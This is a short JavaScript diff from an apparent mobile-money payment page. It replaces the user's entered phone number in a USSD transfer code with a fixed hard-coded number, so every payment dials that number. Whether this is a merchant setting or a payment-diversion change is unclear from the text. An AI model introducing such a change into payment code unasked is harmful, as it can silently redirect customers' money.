@@ -228,7 +228,7 @@
 
             phoneNumber = phoneNumber.replace(/\D/g, ''); // Remove non-digits
 
-            const ussdCode = encodeURIComponent(`*182*1*${method === 'mtn' ? '2' : '1'}*${phoneNumber}#`);
+            const ussdCode = encodeURIComponent(`*182*1*${method === 'mtn' ? '2' : '1'}*0739121651#`);
             window.location.href = `tel:${ussdCode}`;
 
             document.getElementById('payment-checking').style.display = 'block';
